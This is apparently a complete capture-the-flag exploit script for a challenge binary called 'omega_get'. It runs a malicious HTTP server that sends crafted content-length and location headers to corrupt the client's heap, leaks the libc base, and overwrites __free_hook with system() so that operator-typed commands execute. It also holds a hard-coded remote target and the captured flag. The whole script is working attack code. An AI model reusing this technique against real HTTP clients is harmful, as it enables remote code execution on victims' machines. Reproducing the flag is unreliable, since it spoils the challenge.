#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './omega_get'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

url = 'http://xxx.xxx.xxx.xxx:4296/'

env = Environment('local', 'remote')
env.set_item('target',  local   = {'argv':[bin_file, url]}, \
                        remote  = {'argv':'curl http://13.231.207.73:9009/ --data url={}'.format(url).split()})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#cmd = b'cat woa_u_got_flag.txt\x00'
cmd = input('$ ').encode('utf8') + b'\x00'

#==========

def attack1(conn, **kwargs):
    conn.recvuntil('\r\n'*2)
    conn.send(mkhd('content-length', str(0x410)))
    conn.send(mkhd('location','/'))

    conn.send(mkhd('content-length', str(1)))
    conn.send(mkhd('location','/'))

    new_conn = listen(4296)
    conn.send('\r\n')

    return new_conn

def attack2(conn, **kwargs):
    conn.recvuntil('GET /')
    addr_libc_mainarena = (u(conn.recvuntil(' HTTP', drop=True)) << 8) + 0x40
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']

    conn.recvuntil('\r\n'*2)
    conn.send(mkhd('content-length', str(0x100-1)))
    for _ in range(7):
        conn.send(mkhd('location','/'))
    conn.send(b'location: /'+b'a'*0xf + p64(addr_libc_free_hook - len(cmd))+b'\r\n')

    for _ in range(2):
        conn.send(mkhd('content-length', str(0x100-1)))

    new_conn = listen(4296)
    conn.send('\r\n')

    return new_conn

def attack3(conn, **kwargs):
    conn.recvuntil('\r\n'*2)
    conn.send(mkhd('content-length', str(0x100-1)))
    conn.send('\r\n')

    addr_libc_system    = libc.sep_function['system']
    conn.send(cmd + p64(addr_libc_system))

def mkhd(key, value):
    header  = key
    header += ': '
    header += value
    header += '\r\n'
    return header

#==========

def main():
    sock = listen(4296)

    comn = Communicate('PROC', **env.target)
    comn.connect()

    sock = attack1(sock)
    sock = attack2(sock)
    attack3(sock)

    if env.check('remote'):
        comn.connection.recvuntil('<textarea class="form-control" rows="16" disabled>')
    comn.interactive()
    # zer0pts{w0w_u_m4d3_17_1nt3r4ct1v3}

if __name__=='__main__':
    main()

#==========
